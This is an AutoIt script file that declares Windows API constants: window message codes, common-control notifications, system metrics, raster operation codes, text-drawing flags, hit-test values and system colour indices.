Global Const $WS_EX_OVERLAPPEDWINDOW = BitOR($WS_EX_CLIENTEDGE, $WS_EX_WINDOWEDGE)
Global Const $WS_EX_PALETTEWINDOW = BitOR($WS_EX_TOOLWINDOW, $WS_EX_TOPMOST, $WS_EX_WINDOWEDGE)
Global Const $WM_NULL = 0x0
Global Const $WM_CREATE = 0x1
Global Const $WM_DESTROY = 0x2
Global Const $WM_MOVE = 0x3
Global Const $WM_SIZEWAIT = 0x4
Global Const $WM_SIZE = 0x5
Global Const $WM_ACTIVATE = 0x6
Global Const $WM_SETFOCUS = 0x7
Global Const $WM_KILLFOCUS = 0x8
Global Const $WM_SETVISIBLE = 0x9
Global Const $WM_ENABLE = 0xa
Global Const $WM_SETREDRAW = 0xb
Global Const $WM_SETTEXT = 0xc
Global Const $WM_GETTEXT = 0xd
Global Const $WM_GETTEXTLENGTH = 0xe
Global Const $WM_PAINT = 0xf
Global Const $WM_CLOSE = 0x10
Global Const $WM_QUERYENDSESSION = 0x11
Global Const $WM_QUIT = 0x12
Global Const $WM_ERASEBKGND = 0x14
Global Const $WM_QUERYOPEN = 0x13
Global Const $WM_SYSCOLORCHANGE = 0x15
Global Const $WM_ENDSESSION = 0x16
Global Const $WM_SYSTEMERROR = 0x17
Global Const $WM_SHOWWINDOW = 0x18
Global Const $WM_CTLCOLOR = 0x19
Global Const $WM_SETTINGCHANGE = 0x1a
Global Const $WM_WININICHANGE = 0x1a
Global Const $WM_DEVMODECHANGE = 0x1b
Global Const $WM_ACTIVATEAPP = 0x1c
Global Const $WM_FONTCHANGE = 0x1d
Global Const $WM_TIMECHANGE = 0x1e
Global Const $WM_CANCELMODE = 0x1f
Global Const $WM_SETCURSOR = 0x20
Global Const $WM_MOUSEACTIVATE = 0x21
Global Const $WM_CHILDACTIVATE = 0x22
Global Const $WM_QUEUESYNC = 0x23
Global Const $WM_GETMINMAXINFO = 0x24
Global Const $WM_LOGOFF = 0x25
Global Const $WM_PAINTICON = 0x26
Global Const $WM_ICONERASEBKGND = 0x27
Global Const $WM_NEXTDLGCTL = 0x28
Global Const $WM_ALTTABACTIVE = 0x29
Global Const $WM_SPOOLERSTATUS = 0x2a
Global Const $WM_DRAWITEM = 0x2b
Global Const $WM_MEASUREITEM = 0x2c
Global Const $WM_DELETEITEM = 0x2d
Global Const $WM_VKEYTOITEM = 0x2e
Global Const $WM_CHARTOITEM = 0x2f
Global Const $WM_SETFONT = 0x30
Global Const $WM_GETFONT = 0x31
Global Const $WM_SETHOTKEY = 0x32
Global Const $WM_GETHOTKEY = 0x33
Global Const $WM_FILESYSCHANGE = 0x34
Global Const $WM_ISACTIVEICON = 0x35
Global Const $WM_QUERYPARKICON = 0x36
Global Const $WM_QUERYDRAGICON = 0x37
Global Const $WM_WINHELP = 0x38
Global Const $WM_COMPAREITEM = 0x39
Global Const $WM_FULLSCREEN = 0x3a
Global Const $WM_CLIENTSHUTDOWN = 0x3b
Global Const $WM_DDEMLEVENT = 0x3c
Global Const $WM_GETOBJECT = 0x3d
Global Const $WM_CALCSCROLL = 0x3f
Global Const $WM_TESTING = 0x40
Global Const $WM_COMPACTING = 0x41
Global Const $WM_OTHERWINDOWCREATED = 0x42
Global Const $WM_OTHERWINDOWDESTROYED = 0x43
Global Const $WM_COMMNOTIFY = 0x44
Global Const $WM_MEDIASTATUSCHANGE = 0x45
Global Const $WM_WINDOWPOSCHANGING = 0x46
Global Const $WM_WINDOWPOSCHANGED = 0x47
Global Const $WM_POWER = 0x48
Global Const $WM_COPYGLOBALDATA = 0x49
Global Const $WM_COPYDATA = 0x4a
Global Const $WM_CANCELJOURNAL = 0x4b
Global Const $WM_LOGONNOTIFY = 0x4c
Global Const $WM_KEYF1 = 0x4d
Global Const $WM_NOTIFY = 0x4e
Global Const $WM_ACCESS_WINDOW = 0x4f
Global Const $WM_INPUTLANGCHANGEREQUEST = 0x50
Global Const $WM_INPUTLANGCHANGE = 0x51
Global Const $WM_TCARD = 0x52
Global Const $WM_HELP = 0x53
Global Const $WM_USERCHANGED = 0x54
Global Const $WM_NOTIFYFORMAT = 0x55
Global Const $WM_QM_ACTIVATE = 0x60
Global Const $WM_HOOK_DO_CALLBACK = 0x61
Global Const $WM_SYSCOPYDATA = 0x62
Global Const $WM_FINALDESTROY = 0x70
Global Const $WM_MEASUREITEM_CLIENTDATA = 0x71
Global Const $WM_CONTEXTMENU = 0x7b
Global Const $WM_STYLECHANGING = 0x7c
Global Const $WM_STYLECHANGED = 0x7d
Global Const $WM_DISPLAYCHANGE = 0x7e
Global Const $WM_GETICON = 0x7f
Global Const $WM_SETICON = 0x80
Global Const $WM_NCCREATE = 0x81
Global Const $WM_NCDESTROY = 0x82
Global Const $WM_NCCALCSIZE = 0x83
Global Const $WM_NCHITTEST = 0x84
Global Const $WM_NCPAINT = 0x85
Global Const $WM_NCACTIVATE = 0x86
Global Const $WM_GETDLGCODE = 0x87
Global Const $WM_SYNCPAINT = 0x88
Global Const $WM_SYNCTASK = 0x89
Global Const $WM_KLUDGEMINRECT = 0x8b
Global Const $WM_LPKDRAWSWITCHWND = 0x8c
Global Const $WM_UAHDESTROYWINDOW = 0x90
Global Const $WM_UAHDRAWMENU = 0x91
Global Const $WM_UAHDRAWMENUITEM = 0x92
Global Const $WM_UAHINITMENU = 0x93
Global Const $WM_UAHMEASUREMENUITEM = 0x94
Global Const $WM_UAHNCPAINTMENUPOPUP = 0x95
Global Const $WM_NCMOUSEMOVE = 0xa0
Global Const $WM_NCLBUTTONDOWN = 0xa1
Global Const $WM_NCLBUTTONUP = 0xa2
Global Const $WM_NCLBUTTONDBLCLK = 0xa3
Global Const $WM_NCRBUTTONDOWN = 0xa4
Global Const $WM_NCRBUTTONUP = 0xa5
Global Const $WM_NCRBUTTONDBLCLK = 0xa6
Global Const $WM_NCMBUTTONDOWN = 0xa7
Global Const $WM_NCMBUTTONUP = 0xa8
Global Const $WM_NCMBUTTONDBLCLK = 0xa9
Global Const $WM_NCXBUTTONDOWN = 0xab
Global Const $WM_NCXBUTTONUP = 0xac
Global Const $WM_NCXBUTTONDBLCLK = 0xad
Global Const $WM_NCUAHDRAWCAPTION = 0xae
Global Const $WM_NCUAHDRAWFRAME = 0xaf
Global Const $WM_INPUT_DEVICE_CHANGE = 0xfe
Global Const $WM_INPUT = 0xff
Global Const $WM_KEYDOWN = 0x100
Global Const $WM_KEYFIRST = 0x100
Global Const $WM_KEYUP = 0x101
Global Const $WM_CHAR = 0x102
Global Const $WM_DEADCHAR = 0x103
Global Const $WM_SYSKEYDOWN = 0x104
Global Const $WM_SYSKEYUP = 0x105
Global Const $WM_SYSCHAR = 0x106
Global Const $WM_SYSDEADCHAR = 0x107
Global Const $WM_YOMICHAR = 0x108
Global Const $WM_KEYLAST = 0x109
Global Const $WM_UNICHAR = 0x109
Global Const $WM_CONVERTREQUEST = 0x10a
Global Const $WM_CONVERTRESULT = 0x10b
Global Const $WM_IM_INFO = 0x10c
Global Const $WM_IME_STARTCOMPOSITION = 0x10d
Global Const $WM_IME_ENDCOMPOSITION = 0x10e
Global Const $WM_IME_COMPOSITION = 0x10f
Global Const $WM_IME_KEYLAST = 0x10f
Global Const $WM_INITDIALOG = 0x110
Global Const $WM_COMMAND = 0x111
Global Const $WM_SYSCOMMAND = 0x112
Global Const $WM_TIMER = 0x113
Global Const $WM_HSCROLL = 0x114
Global Const $WM_VSCROLL = 0x115
Global Const $WM_INITMENU = 0x116
Global Const $WM_INITMENUPOPUP = 0x117
Global Const $WM_SYSTIMER = 0x118
Global Const $WM_GESTURE = 0x119
Global Const $WM_GESTURENOTIFY = 0x11a
Global Const $WM_GESTUREINPUT = 0x11b
Global Const $WM_GESTURENOTIFIED = 0x11c
Global Const $WM_MENUSELECT = 0x11f
Global Const $WM_MENUCHAR = 0x120
Global Const $WM_ENTERIDLE = 0x121
Global Const $WM_MENURBUTTONUP = 0x122
Global Const $WM_MENUDRAG = 0x123
Global Const $WM_MENUGETOBJECT = 0x124
Global Const $WM_UNINITMENUPOPUP = 0x125
Global Const $WM_MENUCOMMAND = 0x126
Global Const $WM_CHANGEUISTATE = 0x127
Global Const $WM_UPDATEUISTATE = 0x128
Global Const $WM_QUERYUISTATE = 0x129
Global Const $WM_LBTRACKPOINT = 0x131
Global Const $WM_CTLCOLORMSGBOX = 0x132
Global Const $WM_CTLCOLOREDIT = 0x133
Global Const $WM_CTLCOLORLISTBOX = 0x134
Global Const $WM_CTLCOLORBTN = 0x135
Global Const $WM_CTLCOLORDLG = 0x136
Global Const $WM_CTLCOLORSCROLLBAR = 0x137
Global Const $WM_CTLCOLORSTATIC = 0x138
Global Const $MN_GETHMENU = 0x1e1
Global Const $WM_PARENTNOTIFY = 0x210
Global Const $WM_ENTERMENULOOP = 0x211
Global Const $WM_EXITMENULOOP = 0x212
Global Const $WM_NEXTMENU = 0x213
Global Const $WM_SIZING = 0x214
Global Const $WM_CAPTURECHANGED = 0x215
Global Const $WM_MOVING = 0x216
Global Const $WM_POWERBROADCAST = 0x218
Global Const $WM_DEVICECHANGE = 0x219
Global Const $WM_MDICREATE = 0x220
Global Const $WM_MDIDESTROY = 0x221
Global Const $WM_MDIACTIVATE = 0x222
Global Const $WM_MDIRESTORE = 0x223
Global Const $WM_MDINEXT = 0x224
Global Const $WM_MDIMAXIMIZE = 0x225
Global Const $WM_MDITILE = 0x226
Global Const $WM_MDICASCADE = 0x227
Global Const $WM_MDIICONARRANGE = 0x228
Global Const $WM_MDIGETACTIVE = 0x229
Global Const $WM_DROPOBJECT = 0x22a
Global Const $WM_QUERYDROPOBJECT = 0x22b
Global Const $WM_BEGINDRAG = 0x22c
Global Const $WM_DRAGLOOP = 0x22d
Global Const $WM_DRAGSELECT = 0x22e
Global Const $WM_DRAGMOVE = 0x22f
Global Const $WM_MDISETMENU = 0x230
Global Const $WM_ENTERSIZEMOVE = 0x231
Global Const $WM_EXITSIZEMOVE = 0x232
Global Const $WM_DROPFILES = 0x233
Global Const $WM_MDIREFRESHMENU = 0x234
Global Const $WM_TOUCH = 0x240
Global Const $WM_IME_SETCONTEXT = 0x281
Global Const $WM_IME_NOTIFY = 0x282
Global Const $WM_IME_CONTROL = 0x283
Global Const $WM_IME_COMPOSITIONFULL = 0x284
Global Const $WM_IME_SELECT = 0x285
Global Const $WM_IME_CHAR = 0x286
Global Const $WM_IME_SYSTEM = 0x287
Global Const $WM_IME_REQUEST = 0x288
Global Const $WM_IME_KEYDOWN = 0x290
Global Const $WM_IME_KEYUP = 0x291
Global Const $WM_NCMOUSEHOVER = 0x2a0
Global Const $WM_MOUSEHOVER = 0x2a1
Global Const $WM_NCMOUSELEAVE = 0x2a2
Global Const $WM_MOUSELEAVE = 0x2a3
Global Const $WM_WTSSESSION_CHANGE = 0x2b1
Global Const $WM_TABLET_FIRST = 0x2c0
Global Const $WM_TABLET_LAST = 0x2df
Global Const $WM_CUT = 0x300
Global Const $WM_COPY = 0x301
Global Const $WM_PASTE = 0x302
Global Const $WM_CLEAR = 0x303
Global Const $WM_UNDO = 0x304
Global Const $WM_PALETTEISCHANGING = 0x310
Global Const $WM_HOTKEY = 0x312
Global Const $WM_PALETTECHANGED = 0x311
Global Const $WM_SYSMENU = 0x313
Global Const $WM_HOOKMSG = 0x314
Global Const $WM_EXITPROCESS = 0x315
Global Const $WM_WAKETHREAD = 0x316
Global Const $WM_PRINT = 0x317
Global Const $WM_PRINTCLIENT = 0x318
Global Const $WM_APPCOMMAND = 0x319
Global Const $WM_QUERYNEWPALETTE = 0x30f
Global Const $WM_THEMECHANGED = 0x31a
Global Const $WM_UAHINIT = 0x31b
Global Const $WM_DESKTOPNOTIFY = 0x31c
Global Const $WM_CLIPBOARDUPDATE = 0x31d
Global Const $WM_DWMCOMPOSITIONCHANGED = 0x31e
Global Const $WM_DWMNCRENDERINGCHANGED = 0x31f
Global Const $WM_DWMCOLORIZATIONCOLORCHANGED = 0x320
Global Const $WM_DWMWINDOWMAXIMIZEDCHANGE = 0x321
Global Const $WM_DWMEXILEFRAME = 0x322
Global Const $WM_DWMSENDICONICTHUMBNAIL = 0x323
Global Const $WM_MAGNIFICATION_STARTED = 0x324
Global Const $WM_MAGNIFICATION_ENDED = 0x325
Global Const $WM_DWMSENDICONICLIVEPREVIEWBITMAP = 0x326
Global Const $WM_DWMTHUMBNAILSIZECHANGED = 0x327
Global Const $WM_MAGNIFICATION_OUTPUT = 0x328
Global Const $WM_MEASURECONTROL = 0x330
Global Const $WM_GETACTIONTEXT = 0x331
Global Const $WM_FORWARDKEYDOWN = 0x333
Global Const $WM_FORWARDKEYUP = 0x334
Global Const $WM_GETTITLEBARINFOEX = 0x33f
Global Const $WM_NOTIFYWOW = 0x340
Global Const $WM_HANDHELDFIRST = 0x358
Global Const $WM_HANDHELDLAST = 0x35f
Global Const $WM_AFXFIRST = 0x360
Global Const $WM_AFXLAST = 0x37f
Global Const $WM_PENWINFIRST = 0x380
Global Const $WM_PENWINLAST = 0x38f
Global Const $WM_DDE_INITIATE = 0x3e0
Global Const $WM_DDE_TERMINATE = 0x3e1
Global Const $WM_DDE_ADVISE = 0x3e2
Global Const $WM_DDE_UNADVISE = 0x3e3
Global Const $WM_DDE_ACK = 0x3e4
Global Const $WM_DDE_DATA = 0x3e5
Global Const $WM_DDE_REQUEST = 0x3e6
Global Const $WM_DDE_POKE = 0x3e7
Global Const $WM_DDE_EXECUTE = 0x3e8
Global Const $WM_DBNOTIFICATION = 0x3fd
Global Const $WM_NETCONNECT = 0x3fe
Global Const $WM_HIBERNATE = 0x3ff
Global Const $WM_USER = 0x400
Global Const $WM_APP = 0x8000
Global Const $NM_FIRST = 0x0
Global Const $NM_OUTOFMEMORY = $NM_FIRST + -1
Global Const $NM_CLICK = $NM_FIRST + -2
Global Const $NM_DBLCLK = $NM_FIRST + -3
Global Const $NM_RETURN = $NM_FIRST + -4
Global Const $NM_RCLICK = $NM_FIRST + -5
Global Const $NM_RDBLCLK = $NM_FIRST + -6
Global Const $NM_SETFOCUS = $NM_FIRST + -7
Global Const $NM_KILLFOCUS = $NM_FIRST + -8
Global Const $NM_CUSTOMDRAW = $NM_FIRST + -12
Global Const $NM_HOVER = $NM_FIRST + -13
Global Const $NM_NCHITTEST = $NM_FIRST + -14
Global Const $NM_KEYDOWN = $NM_FIRST + -15
Global Const $NM_RELEASEDCAPTURE = $NM_FIRST + -16
Global Const $NM_SETCURSOR = $NM_FIRST + -17
Global Const $NM_CHAR = $NM_FIRST + -18
Global Const $NM_TOOLTIPSCREATED = $NM_FIRST + -19
Global Const $NM_LDOWN = $NM_FIRST + -20
Global Const $NM_RDOWN = $NM_FIRST + -21
Global Const $NM_THEMECHANGED = $NM_FIRST + -22
Global Const $WM_MOUSEFIRST = 0x200
Global Const $WM_MOUSEMOVE = 0x200
Global Const $WM_LBUTTONDOWN = 0x201
Global Const $WM_LBUTTONUP = 0x202
Global Const $WM_LBUTTONDBLCLK = 0x203
Global Const $WM_RBUTTONDOWN = 0x204
Global Const $WM_RBUTTONUP = 0x205
Global Const $WM_RBUTTONDBLCLK = 0x206
Global Const $WM_MBUTTONDOWN = 0x207
Global Const $WM_MBUTTONUP = 0x208
Global Const $WM_MBUTTONDBLCLK = 0x209
Global Const $WM_MOUSEWHEEL = 0x20a
Global Const $WM_XBUTTONDOWN = 0x20b
Global Const $WM_XBUTTONUP = 0x20c
Global Const $WM_XBUTTONDBLCLK = 0x20d
Global Const $WM_MOUSEHWHEEL = 0x20e
Global Const $PS_SOLID = 0x0
Global Const $PS_DASH = 0x1
Global Const $PS_DOT = 0x2
Global Const $PS_DASHDOT = 0x3
Global Const $PS_DASHDOTDOT = 0x4
Global Const $PS_NULL = 0x5
Global Const $PS_INSIDEFRAME = 0x6
Global Const $PS_USERSTYLE = 0x7
Global Const $PS_ALTERNATE = 0x8
Global Const $PS_ENDCAP_ROUND = 0x0
Global Const $PS_ENDCAP_SQUARE = 0x100
Global Const $PS_ENDCAP_FLAT = 0x200
Global Const $PS_JOIN_BEVEL = 0x1000
Global Const $PS_JOIN_MITER = 0x2000
Global Const $PS_JOIN_ROUND = 0x0
Global Const $PS_GEOMETRIC = 0x10000
Global Const $PS_COSMETIC = 0x0
Global Const $LWA_ALPHA = 0x2
Global Const $LWA_COLORKEY = 0x1
Global Const $RGN_AND = 0x1
Global Const $RGN_OR = 0x2
Global Const $RGN_XOR = 0x3
Global Const $RGN_DIFF = 0x4
Global Const $RGN_COPY = 0x5
Global Const $ERRORREGION = 0x0
Global Const $NULLREGION = 0x1
Global Const $SIMPLEREGION = 0x2
Global Const $COMPLEXREGION = 0x3
Global Const $TRANSPARENT = 0x1
Global Const $OPAQUE = 0x2
Global Const $CCM_FIRST = 0x2000
Global Const $CCM_GETUNICODEFORMAT = ($CCM_FIRST + 0x6)
Global Const $CCM_SETUNICODEFORMAT = ($CCM_FIRST + 0x5)
Global Const $CCM_SETBKCOLOR = $CCM_FIRST + 0x1
Global Const $CCM_SETCOLORSCHEME = $CCM_FIRST + 0x2
Global Const $CCM_GETCOLORSCHEME = $CCM_FIRST + 0x3
Global Const $CCM_GETDROPTARGET = $CCM_FIRST + 0x4
Global Const $CCM_SETWINDOWTHEME = $CCM_FIRST + 0xb
Global Const $GA_PARENT = 0x1
Global Const $GA_ROOT = 0x2
Global Const $GA_ROOTOWNER = 0x3
Global Const $SM_CXSCREEN = 0x0
Global Const $SM_CYSCREEN = 0x1
Global Const $SM_CXVSCROLL = 0x2
Global Const $SM_CYHSCROLL = 0x3
Global Const $SM_CYCAPTION = 0x4
Global Const $SM_CXBORDER = 0x5
Global Const $SM_CYBORDER = 0x6
Global Const $SM_CXFIXEDFRAME = 0x7
Global Const $SM_CXDLGFRAME = $SM_CXFIXEDFRAME
Global Const $SM_CYFIXEDFRAME = 0x8
Global Const $SM_CYDLGFRAME = $SM_CYFIXEDFRAME
Global Const $SM_CYVTHUMB = 0x9
Global Const $SM_CXHTHUMB = 0xa
Global Const $SM_CXICON = 0xb
Global Const $SM_CYICON = 0xc
Global Const $SM_CXCURSOR = 0xd
Global Const $SM_CYCURSOR = 0xe
Global Const $SM_CYMENU = 0xf
Global Const $SM_CXFULLSCREEN = 0x10
Global Const $SM_CYFULLSCREEN = 0x11
Global Const $SM_CYKANJIWINDOW = 0x12
Global Const $SM_MOUSEPRESENT = 0x13
Global Const $SM_CYVSCROLL = 0x14
Global Const $SM_CXHSCROLL = 0x15
Global Const $SM_DEBUG = 0x16
Global Const $SM_SWAPBUTTON = 0x17
Global Const $SM_RESERVED1 = 0x18
Global Const $SM_RESERVED2 = 0x19
Global Const $SM_RESERVED3 = 0x1a
Global Const $SM_RESERVED4 = 0x1b
Global Const $SM_CXMIN = 0x1c
Global Const $SM_CYMIN = 0x1d
Global Const $SM_CXSIZE = 0x1e
Global Const $SM_CYSIZE = 0x1f
Global Const $SM_CXSIZEFRAME = 0x20
Global Const $SM_CXFRAME = $SM_CXSIZEFRAME
Global Const $SM_CYSIZEFRAME = 0x21
Global Const $SM_CYFRAME = $SM_CYSIZEFRAME
Global Const $SM_CXMINTRACK = 0x22
Global Const $SM_CYMINTRACK = 0x23
Global Const $SM_CXDOUBLECLK = 0x24
Global Const $SM_CYDOUBLECLK = 0x25
Global Const $SM_CXICONSPACING = 0x26
Global Const $SM_CYICONSPACING = 0x27
Global Const $SM_MENUDROPALIGNMENT = 0x28
Global Const $SM_PENWINDOWS = 0x29
Global Const $SM_DBCSENABLED = 0x2a
Global Const $SM_CMOUSEBUTTONS = 0x2b
Global Const $SM_SECURE = 0x2c
Global Const $SM_CXEDGE = 0x2d
Global Const $SM_CYEDGE = 0x2e
Global Const $SM_CXMINSPACING = 0x2f
Global Const $SM_CYMINSPACING = 0x30
Global Const $SM_CXSMICON = 0x31
Global Const $SM_CYSMICON = 0x32
Global Const $SM_CYSMCAPTION = 0x33
Global Const $SM_CXSMSIZE = 0x34
Global Const $SM_CYSMSIZE = 0x35
Global Const $SM_CXMENUSIZE = 0x36
Global Const $SM_CYMENUSIZE = 0x37
Global Const $SM_ARRANGE = 0x38
Global Const $SM_CXMINIMIZED = 0x39
Global Const $SM_CYMINIMIZED = 0x3a
Global Const $SM_CXMAXTRACK = 0x3b
Global Const $SM_CYMAXTRACK = 0x3c
Global Const $SM_CXMAXIMIZED = 0x3d
Global Const $SM_CYMAXIMIZED = 0x3e
Global Const $SM_NETWORK = 0x3f
Global Const $SM_CLEANBOOT = 0x43
Global Const $SM_CXDRAG = 0x44
Global Const $SM_CYDRAG = 0x45
Global Const $SM_SHOWSOUNDS = 0x46
Global Const $SM_CXMENUCHECK = 0x47
Global Const $SM_CYMENUCHECK = 0x48
Global Const $SM_SLOWMACHINE = 0x49
Global Const $SM_MIDEASTENABLED = 0x4a
Global Const $SM_MOUSEWHEELPRESENT = 0x4b
Global Const $SM_XVIRTUALSCREEN = 0x4c
Global Const $SM_YVIRTUALSCREEN = 0x4d
Global Const $SM_CXVIRTUALSCREEN = 0x4e
Global Const $SM_CYVIRTUALSCREEN = 0x4f
Global Const $SM_CMONITORS = 0x50
Global Const $SM_SAMEDISPLAYFORMAT = 0x51
Global Const $SM_IMMENABLED = 0x52
Global Const $SM_CXFOCUSBORDER = 0x53
Global Const $SM_CYFOCUSBORDER = 0x54
Global Const $SM_TABLETPC = 0x56
Global Const $SM_MEDIACENTER = 0x57
Global Const $SM_STARTER = 0x58
Global Const $SM_SERVERR2 = 0x59
Global Const $SM_CMETRICS = 0x5a
Global Const $SM_REMOTESESSION = 0x1000
Global Const $SM_SHUTTINGDOWN = 0x2000
Global Const $SM_REMOTECONTROL = 0x2001
Global Const $SM_CARETBLINKINGENABLED = 0x2002
Global Const $BLACKNESS = 0x42
Global Const $CAPTUREBLT = 0x40000000
Global Const $DSTINVERT = 0x550009
Global Const $MERGECOPY = 0xc000ca
Global Const $MERGEPAINT = 0xbb0226
Global Const $NOMIRRORBITMAP = -2147483648
Global Const $NOTSRCCOPY = 0x330008
Global Const $NOTSRCERASE = 0x1100a6
Global Const $PATCOPY = 0xf00021
Global Const $PATINVERT = 0x5a0049
Global Const $PATPAINT = 0xfb0a09
Global Const $SRCAND = 0x8800c6
Global Const $SRCCOPY = 0xcc0020
Global Const $SRCERASE = 0x440328
Global Const $SRCINVERT = 0x660046
Global Const $SRCPAINT = 0xee0086
Global Const $WHITENESS = 0xff0062
Global Const $DT_BOTTOM = 0x8
Global Const $DT_CALCRECT = 0x400
Global Const $DT_CENTER = 0x1
Global Const $DT_EDITCONTROL = 0x2000
Global Const $DT_END_ELLIPSIS = 0x8000
Global Const $DT_EXPANDTABS = 0x40
Global Const $DT_EXTERNALLEADING = 0x200
Global Const $DT_HIDEPREFIX = 0x100000
Global Const $DT_INTERNAL = 0x1000
Global Const $DT_LEFT = 0x0
Global Const $DT_MODIFYSTRING = 0x10000
Global Const $DT_NOCLIP = 0x100
Global Const $DT_NOFULLWIDTHCHARBREAK = 0x80000
Global Const $DT_NOPREFIX = 0x800
Global Const $DT_PATH_ELLIPSIS = 0x4000
Global Const $DT_PREFIXONLY = 0x200000
Global Const $DT_RIGHT = 0x2
Global Const $DT_RTLREADING = 0x20000
Global Const $DT_SINGLELINE = 0x20
Global Const $DT_TABSTOP = 0x80
Global Const $DT_TOP = 0x0
Global Const $DT_VCENTER = 0x4
Global Const $DT_WORDBREAK = 0x10
Global Const $DT_WORD_ELLIPSIS = 0x40000
Global Const $RDW_ERASE = 0x4
Global Const $RDW_FRAME = 0x400
Global Const $RDW_INTERNALPAINT = 0x2
Global Const $RDW_INVALIDATE = 0x1
Global Const $RDW_NOERASE = 0x20
Global Const $RDW_NOFRAME = 0x800
Global Const $RDW_NOINTERNALPAINT = 0x10
Global Const $RDW_VALIDATE = 0x8
Global Const $RDW_ERASENOW = 0x200
Global Const $RDW_UPDATENOW = 0x100
Global Const $RDW_ALLCHILDREN = 0x80
Global Const $RDW_NOCHILDREN = 0x40
Global Const $WM_RENDERFORMAT = 0x305
Global Const $WM_RENDERALLFORMATS = 0x306
Global Const $WM_DESTROYCLIPBOARD = 0x307
Global Const $WM_DRAWCLIPBOARD = 0x308
Global Const $WM_PAINTCLIPBOARD = 0x309
Global Const $WM_VSCROLLCLIPBOARD = 0x30a
Global Const $WM_SIZECLIPBOARD = 0x30b
Global Const $WM_ASKCBFORMATNAME = 0x30c
Global Const $WM_CHANGECBCHAIN = 0x30d
Global Const $WM_HSCROLLCLIPBOARD = 0x30e
Global Const $HTERROR = + -2
Global Const $HTTRANSPARENT = + -1
Global Const $HTNOWHERE = 0x0
Global Const $HTCLIENT = 0x1
Global Const $HTCAPTION = 0x2
Global Const $HTSYSMENU = 0x3
Global Const $HTGROWBOX = 0x4
Global Const $HTSIZE = $HTGROWBOX
Global Const $HTMENU = 0x5
Global Const $HTHSCROLL = 0x6
Global Const $HTVSCROLL = 0x7
Global Const $HTMINBUTTON = 0x8
Global Const $HTMAXBUTTON = 0x9
Global Const $HTLEFT = 0xa
Global Const $HTRIGHT = 0xb
Global Const $HTTOP = 0xc
Global Const $HTTOPLEFT = 0xd
Global Const $HTTOPRIGHT = 0xe
Global Const $HTBOTTOM = 0xf
Global Const $HTBOTTOMLEFT = 0x10
Global Const $HTBOTTOMRIGHT = 0x11
Global Const $HTBORDER = 0x12
Global Const $HTREDUCE = $HTMINBUTTON
Global Const $HTZOOM = $HTMAXBUTTON
Global Const $HTSIZEFIRST = $HTLEFT
Global Const $HTSIZELAST = $HTBOTTOMRIGHT
Global Const $HTOBJECT = 0x13
Global Const $HTCLOSE = 0x14
Global Const $HTHELP = 0x15
Global Const $COLOR_SCROLLBAR = 0x0
Global Const $COLOR_BACKGROUND = 0x1
Global Const $COLOR_ACTIVECAPTION = 0x2
Global Const $COLOR_INACTIVECAPTION = 0x3
Global Const $COLOR_MENU = 0x4
Global Const $COLOR_WINDOW = 0x5
Global Const $COLOR_WINDOWFRAME = 0x6
Global Const $COLOR_MENUTEXT = 0x7
Global Const $COLOR_WINDOWTEXT = 0x8
Global Const $COLOR_CAPTIONTEXT = 0x9
Global Const $COLOR_ACTIVEBORDER = 0xa
Global Const $COLOR_INACTIVEBORDER = 0xb
Global Const $COLOR_APPWORKSPACE = 0xc
Global Const $COLOR_HIGHLIGHT = 0xd
Global Const $COLOR_HIGHLIGHTTEXT = 0xe
Global Const $COLOR_BTNFACE = 0xf
Global Const $COLOR_BTNSHADOW = 0x10
Global Const $COLOR_GRAYTEXT = 0x11
Global Const $COLOR_BTNTEXT = 0x12
Global Const $COLOR_INACTIVECAPTIONTEXT = 0x13
Global Const $COLOR_BTNHIGHLIGHT = 0x14
Global Const $COLOR_3DDKSHADOW = 0x15
Global Const $COLOR_3DLIGHT = 0x16
Global Const $COLOR_INFOTEXT = 0x17
Global Const $COLOR_INFOBK = 0x18
Global Const $COLOR_HOTLIGHT = 0x1a
Global Const $COLOR_GRADIENTACTIVECAPTION = 0x1b
Global Const $COLOR_GRADIENTINACTIVECAPTION = 0x1c
Global Const $COLOR_MENUHILIGHT = 0x1d
Global Const $COLOR_MENUBAR = 0x1e
Global Const $COLOR_DESKTOP = 0x1
Global Const $COLOR_3DFACE = 0xf
Global Const $COLOR_3DSHADOW = 0x10
Global Const $COLOR_3DHIGHLIGHT = 0x14
Global Const $COLOR_3DHILIGHT = 0x14
Global Const $COLOR_BTNHILIGHT = 0x14
Global Const $HINST_COMMCTRL = + -1
Global Const $IDB_STD_SMALL_COLOR = 0x0
Global Const $IDB_STD_LARGE_COLOR = 0x1
Global Const $IDB_VIEW_SMALL_COLOR = 0x4
Global Const $IDB_VIEW_LARGE_COLOR = 0x5
Global Const $IDB_HIST_SMALL_COLOR = 0x8
Global Const $IDB_HIST_LARGE_COLOR = 0x9
Global Const $STARTF_FORCEOFFFEEDBACK = 0x80
Global Const $STARTF_FORCEONFEEDBACK = 0x40
Global Const $STARTF_PREVENTPINNING = 0x2000
Global Const $STARTF_RUNFULLSCREEN = 0x20
Global Const $STARTF_TITLEISAPPID = 0x1000
Global Const $STARTF_TITLEISLINKNAME = 0x800
Global Const $STARTF_USECOUNTCHARS = 0x8
Global Const $STARTF_USEFILLATTRIBUTE = 0x10
Global Const $STARTF_USEHOTKEY = 0x200
Global Const $STARTF_USEPOSITION = 0x4
Global Const $STARTF_USESHOWWINDOW = 0x1
Global Const $STARTF_USESIZE = 0x2
Global Const $STARTF_USESTDHANDLES = 0x100
Global Const $CDDS_PREPAINT = 0x1
Global Const $CDDS_POSTPAINT = 0x2
Global Const $CDDS_PREERASE = 0x3
Global Const $CDDS_POSTERASE = 0x4
Global Const $CDDS_ITEM = 0x10000
Global Const $CDDS_ITEMPREPAINT = 0x10001
Global Const $CDDS_ITEMPOSTPAINT = 0x10002
Global Const $CDDS_ITEMPREERASE = 0x10003
Global Const $CDDS_ITEMPOSTERASE = 0x10004
Global Const $CDDS_SUBITEM = 0x20000
Global Const $CDIS_SELECTED = 0x1
Global Const $CDIS_GRAYED = 0x2
Global Const $CDIS_DISABLED = 0x4
Global Const $CDIS_CHECKED = 0x8
Global Const $CDIS_FOCUS = 0x10
Global Const $CDIS_DEFAULT = 0x20
Global Const $CDIS_HOT = 0x40
Global Const $CDIS_MARKED = 0x80
Global Const $CDIS_INDETERMINATE = 0x100
Global Const $CDIS_SHOWKEYBOARDCUES = 0x200
Global Const $CDIS_NEARHOT = 0x400
Global Const $CDIS_OTHERSIDEHOT = 0x800
Global Const $CDIS_DROPHILITED = 0x1000
Global Const $CDRF_DODEFAULT = 0x0
Global Const $CDRF_NEWFONT = 0x2
Global Const $CDRF_SKIPDEFAULT = 0x4
Global Const $CDRF_NOTIFYPOSTPAINT = 0x10
Global Const $CDRF_NOTIFYITEMDRAW = 0x20
